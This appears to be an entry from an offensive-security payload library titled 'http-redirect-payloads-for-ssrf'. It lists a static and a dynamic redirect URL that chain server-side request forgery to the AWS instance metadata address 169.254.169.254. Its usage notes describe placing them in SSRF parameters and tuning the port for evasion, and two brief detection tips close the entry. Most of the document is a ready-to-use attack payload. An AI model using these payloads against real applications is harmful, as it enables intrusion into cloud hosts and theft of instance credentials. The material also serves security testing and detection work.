---
type: code
language: text
verified: true
created_at: '2023-04-06T03:56:38Z'
updated_at: '2023-04-10T20:23:59Z'
platforms:
  - Web
tags:
  - ssrf
  - redirect
validated: true
---

# http-redirect-payloads-for-ssrf

## Code

```text
Static:http://nicob.net/redir6a
Dynamic:http://nicob.net/redir-http-169.254.169.254:80-
```

## Description

Payloads using external HTTP redirects to chain to AWS metadata, hiding the internal target from direct inspection.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| N/A | Static/dynamic redirect URLs | http://nicob.net/redir6a |

## Usage

Use in SSRF params to trigger redirect to 169.254.169.254. Dynamic allows port manipulation for evasion.

## Detection

- Monitor for redirects from known external domains to internal IPs.
- App logs showing chained requests.

## Related

- [[procedures/Exploit-SSRF-to-Access-AWS-Instance-Metadata]]
